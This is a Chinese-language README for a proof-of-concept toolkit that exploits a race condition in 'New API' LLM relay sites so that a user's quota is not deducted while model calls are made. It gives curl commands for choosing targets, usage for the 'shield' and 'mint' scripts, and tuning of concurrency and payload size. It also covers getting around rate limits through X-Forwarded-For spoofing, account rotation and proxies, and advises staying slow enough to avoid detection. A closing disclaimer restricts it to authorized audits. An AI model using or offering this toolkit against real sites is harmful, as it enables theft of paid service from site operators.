# New API 漏洞 #7 — Lost Update 竞争条件 PoC

## 漏洞概述

| 字段 | 值 |
|------|-----|
| CVE | 未分配 |
| CVSS | 估计 7.5-9.0 |
| 发现日期 | 2026-06-09 |
| 影响版本 | New API v1.0.0-rc.6 ~ v1.0.0-rc.11（至今未修复） |
| 漏洞类型 | TOCTOU / Lost Update 竞争条件 |
| 利用条件 | 有效用户账号 + session cookie |
| 前置知识 | 理解数据库事务隔离级别和竞态条件 |
| 覆盖率 | 估计 10% 以内的 New API 中转站 |

## 漏洞原理

### 正常扣费流程

```
请求到达 → 读取用户余额 (SELECT quota FROM users WHERE id=X)
         → 计算费用 (基于 token 数量和模型单价)
         → 写回余额 (UPDATE users SET quota=quota-cost WHERE id=X)
         → 返回响应
```

### 漏洞触发条件

New API 使用 **乐观锁**（版本号）或 **行级锁** 来保证余额更新的原子性。但在以下情况下锁会失效：

1. **高并发请求** — 多个请求同时到达，竞争同一行的写锁
2. **读-写窗口** — 在「读余额」和「写回余额」之间存在时间窗口
3. **版本号冲突** — 两个请求读到相同的版本号，只有一个能成功写入

### 竞争条件示意

```
时间轴 →

请求A (铸币):  读余额=100 ----→ 计算费用=10 ----→ 写回 90 ✓
请求B (护盾):  读余额=100 ----→ 写回 100 ----→ 成功 (版本号冲突!)

结果: 余额 = 100 (应为 90)，请求A的扣费被丢失
```

### 关键端点

`PUT /api/user/self` — 更新用户设置（sidebar_modules, language 等）

此端点会触发用户信息的读取和写入，在高并发下与扣费流程竞争。

### 成功率影响因素

漏洞成功率受超多因素决定，**每个站点都有自己的甜点参数配置**：

| 因素 | 有利条件 | 不利条件 |
|------|----------|----------|
| Cloudflare | 无 CF | 有 CF（不可利用） |
| 反代类型 | nginx / 裸后端 | Caddy 覆盖 XFF |
| 数据库 | SQLite（单写锁） | MySQL/PG（行锁更难触发） |
| 延迟 | 高延迟（窗口更长） | 低延迟（窗口短） |
| 并发数 | 找到甜点值 | 过低覆盖不够，过高触发 429 |
| Batch 端点 | Batch 不可用（=只有实时扣费） | Batch 可用（分流扣费时机） |
| 部署者 | 小白跟风部署 / 低智力 agent 部署 | 专业运维配置 |

**高成功率场景：**
- 无 CF + high latency + SQLite + batch 不可用 + 安全意识差的小白部署
- 用低智力 agent 自动部署的中转站（默认配置、无任何防护）

**部分站点条件极其优越：** 在特定甜点参数下，余额可几乎锁死不变（Δ≈0 持续数小时），
护盾覆盖率接近 100%，扣费几乎完全穿透不了。

**建议：** 优先使用纯护盾版（`shield.py`）单独测试，观察 15 并发下的 Δ 值，再逐步调整 —shield 找到甜点。

## 文件说明

```
newapi-lost-update-poc/
├── README.md          # 本文件
├── shield.py          # 护盾脚本（纯 asyncio，防扣费）
├── mint.py            # 铸币脚本（纯 stdlib，产生收入）
└── poc.py             # 一键 PoC（护盾+铸币同时运行）
```

所有脚本纯 Python 标准库，无第三方依赖。

## 前置检查

利用前必须确认目标是否可被利用。

### Cloudflare 检查

Cloudflare 会阻断高并发请求，**有 CF 的目标无法利用**。

```bash
curl -sI "https://目标域名/" | grep -i cf-ray
```

| 结果 | 含义 | 可打？ |
|------|------|--------|
| 有 `cf-ray: ...` | Cloudflare 防护 | ❌ 不可打 |
| 无 `cf-ray` | 裸后端 | ✅ 可打 |

### 反代检查

```bash
curl -sI "https://目标域名/" | grep -i server
```

| 反代 | 影响 |
|------|------|
| `server: nginx` | 无影响，XFF 可绕过 |
| `server: cloudflare` | ❌ 不可打 |
| `via: Caddy` | XFF 可能被覆盖，需测试 |
| `server: Apache` | 无影响 |
| 无 server 头 | 需手动确认 |

### 确认 New API 版本

```bash
curl -sI "https://目标域名/" | grep -i "x-new-api-version"
```

应返回 `v1.0.0-rc.6` ~ `v1.0.0-rc.11`。

### 2. 确认 PUT /api/user/self 可用

```bash
curl -s -X PUT "https://目标域名/api/user/self" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=你的cookie" \
  -H "New-Api-User: 你的uid" \
  -d '{"language":"en"}'
```

应返回 `{"success":true, ...}`。

### 3. 测试竞争条件

```bash
# 先记录余额
curl -s "https://目标域名/api/user/self" \
  -H "Cookie: session=你的cookie" \
  -H "New-Api-User: 你的uid" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['quota'])"

# 运行护盾 30 秒，观察余额变化
python3 shield.py --base https://目标域名 --cookie "session=xxx" --uid xxx --selftest --seconds 30
```

如果余额在护盾运行期间保持不变（Δ=0），说明护盾生效。

## 使用方法

### 1. 单独运行护盾（防扣费）

```bash
python3 shield.py \
  --base https://目标域名 \
  --cookie "session=你的cookie" \
  --uid 你的用户ID \
  --shield 15 \
  --selftest
```

### 2. 单独运行铸币（产生收入）

```bash
python3 mint.py \
  --base https://目标域名 \
  --key "sk-你的API密钥" \
  --model gpt-5.4-mini \
  --rpm 2
```

### 3. 一键 PoC（护盾+铸币同时运行）

```bash
python3 poc.py \
  --base https://目标域名 \
  --cookie "session=你的cookie" \
  --uid 你的用户ID \
  --key "sk-你的API密钥" \
  --model gpt-5.4-mini \
  --rpm 2 \
  --shield 15
```

## 铸币模型选择

### 限额 vs 无限额

New API 的 API Key 分两种：

| 类型 | 特点 | 铸币效果 |
|------|------|----------|
| 限额 key | 有 quota 上限 | 扣完即停，需手动充值 |
| 无限额 key | quota = -1 | 不限量，适合长期铸币 |

**建议:** 先确认 key 类型：

```bash
curl -s "https://目标域名/api/token/" \
  -H "Cookie: session=你的cookie" \
  -H "New-Api-User: 你的uid" | python3 -c "
import sys,json
d = json.load(sys.stdin)
for item in d.get('data',{}).get('items',[]):
    print(f\"{item['name']}: remain={item['remain_quota']} unlimited={item['unlimited_quota']}\")
"
```

### 模型选择

| 模型 | 单价 | 推荐场景 |
|------|------|----------|
| `gpt-5.4-mini` | 低 | 日常铸币，速度快 |
| `gpt-4o-mini` | 低 | 备选 |
| `gpt-4o` | 高 | 快速积累（但噪声大） |

**注意:** 模型必须被目标站点支持，否则返回 404。

### Batch 端点

`/v1/batch` 端点（批量请求）**不支持**铸币，因为：
- Batch 请求异步处理，不计入实时扣费
- 竞争窗口与实时请求不同
- 护盾无法覆盖 batch 的扣费时机

**只使用 `/v1/chat/completions` 端点。**

## 参数说明

| 参数 | 说明 | 默认值 | 调优建议 |
|------|------|--------|----------|
| `--base` | 目标 New API 地址 | 必填 | - |
| `--cookie` | session cookie | 与 --key 二选一 | - |
| `--key` | API 密钥（铸币用） | 与 --cookie 二选一 | - |
| `--uid` | 用户 ID | 必填 | - |
| `--shield` | 护盾并发数 | 15 | 见下方调优 |
| `--model` | 铸币模型 | gpt-5.4-mini | 选择目标支持的模型 |
| `--rpm` | 铸币速率（每分钟请求数） | 2 | 2-5 较安全，>10 易被发现 |
| `--selftest` | 每5秒显示余额变化 | False | 验证时开启 |
| `--seconds` | 运行秒数（0=手动停止） | 0 | - |
| `--payload-kb` | sidebar_modules 大小（KB） | 0 | 见下方说明 |
| `--no-xff` | 关闭随机 XFF | 默认开启 | 关闭后依赖真实 IP |

### 并发数调优（--shield）

| 并发数 | 效果 | 适用场景 |
|--------|------|----------|
| 5-10 | 保守，不易触发限流 | 低速隐蔽利用 |
| 15-30 | 平衡，覆盖率高 | 推荐日常使用 |
| 50-100 | 激进，可能触发 429 | 短期快速测试 |
| 100+ | 过量，大部分会超时 | 不推荐 |

**原理:** 并发数越高，在扣费的「读→写」窗口中插入 PUT 请求的概率越大。
但过高会导致：
- 服务器 429 限流
- 本地 socket 写超时
- SQLite 写锁竞争反而降低成功率

### payload-kb 说明

`--payload-kb N` 会将 `sidebar_modules` 字段填充为 N KB 的数据。

**作用:** 加大 PUT 请求的写入时间，延长「读→写」窗口，提高竞争命中率。

**原理:**
```
payload-kb=0:   PUT body ~100B  → 写操作很快完成 → 窗口短
payload-kb=100: PUT body ~100KB → 写操作需要更多时间 → 窗口长
```

**建议:**
- 默认 0 即可（大多数场景足够）
- 如果护盾效果不佳，尝试 50-200
- 过大可能触发服务器 body limit

## 预期输出

### 护盾正常运行

```
[shield] 起始余额=493502
[shield] {'200': 6962, '4xx': 0, '429': 0, 'err': 0} | 余额=493502 (Δ=0)
[shield] {'200': 13917, '4xx': 0, '429': 0, 'err': 0} | 余额=493502 (Δ=0)
```

**正常:** Δ=0 表示余额未被扣除。

### 护盾 + 铸币

```
[poc] 起始余额=493502
[shield] {'200': 6962, ...} | [mint] {'ok': 5, 'fail': 0} | 余额=493502 (Δ=0)
```

**正常:** 铸币 ok 数增加，余额不变。

### 异常情况

```
[shield] {'200': 100, '4xx': 0, '429': 500, 'err': 0} | 余额=490000 (Δ=-3502)
```

**异常:** 大量 429 + 余额下降 → 护盾被限流，扣费穿透。

**解决:** 降低 --shield 并发数，或等待限流窗口过去。

## 绕过限流

### X-Forwarded-For 伪造

脚本默认开启 XFF 伪造，每次请求生成随机 IP：

```python
X-Forwarded-For: 123.45.67.89
X-Real-IP: 123.45.67.89
```

**原理:** 如果 New API 的限流基于 `$proxy_add_x_forwarded_for`（nginx 默认），
伪造 XFF 可以绕过 per-IP 限流。

**注意:** 如果反代（如 Caddy）覆盖了 XFF，此方法无效。

### 429 处理

脚本内置指数退避：
- 遇到 429 → 等待 `backoff * 2`（最大 2 秒）
- 成功 → 重置 backoff
- 随机 jitter 防止惊群

### 限流无效时

如果 XFF 无法绕过（反代覆盖了 XFF），说明限流是基于：
- 用户 ID（uid）
- Session cookie
- 真实 IP

此时需要：
1. 降低并发数
2. 使用多个账号轮换
3. 使用代理 IP

## 获取 Cookie

1. 登录目标 New API 站点
2. 浏览器 F12 → Network → 找到任意 API 请求
3. 复制 Cookie 头中的 `session=...` 值

## 获取用户 ID

1. 登录后访问 `/api/user/self`
2. 响应中的 `data.id` 即为用户 ID

```bash
curl -s "https://目标域名/api/user/self" \
  -H "Cookie: session=你的cookie" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['id'])"
```

## 停止方式

- `Ctrl+C`
- 创建 `/tmp/shield_stop` 文件：`touch /tmp/shield_stop`
- `--seconds N` 自动停止

## 技术细节

### 漏洞代码路径

```
POST /v1/chat/completions (铸币请求)
  → relay.Do() 
    → model.AutoDelete() (可能)
    → quota.ReduceUserQuota() (扣费)
      → db.Begin() (开事务)
      → SELECT quota, version FROM users WHERE id=X (读)
      → UPDATE users SET quota=quota-cost, version=version+1 WHERE id=X AND version=旧版本 (写)
      → db.Commit() (提交)

PUT /api/user/self (护盾请求)
  → controller.UpdateSelf()
    → db.Begin()
    → SELECT * FROM users WHERE id=X (读)
    → UPDATE users SET ... WHERE id=X (写)
    → db.Commit()
```

### 竞争窗口

```
扣费请求:  SELECT quota → [窗口开始] → UPDATE quota → [窗口结束]
护盾请求:  SELECT user → [在此窗口中插入] → UPDATE user
```

护盾请求的 UPDATE 可能修改了 `version` 字段，导致扣费请求的 UPDATE
因 `WHERE version=旧版本` 条件不匹配而失败，扣费被回滚。

### 锁机制

- **SQLite:** 写锁是数据库级别的，同一时间只能有一个写操作
- **MySQL/PostgreSQL:** 行级锁，但乐观锁（version 字段）仍可能冲突
- **New API 默认:** SQLite（单写锁更易触发竞争）

## 注意事项

- 仅用于授权安全审计
- 需要有效的用户账号和 session
- 余额 < 5M 时需注意 affordability gate（quota ≥ 一次预扣估值约 $0.4）
- 高并发可能触发 429 限流，需调整 --shield 参数
- 护盾运行在本地，铸币请求从本地发出
- 建议在服务器上运行（更稳定的网络和更高的并发能力）

## 法律声明

本工具仅用于合法的安全审计和漏洞研究。使用者必须：
1. 获得目标系统所有者的明确授权
2. 遵守当地法律法规
3. 不得用于非法用途

作者不对滥用本工具造成的任何后果负责。
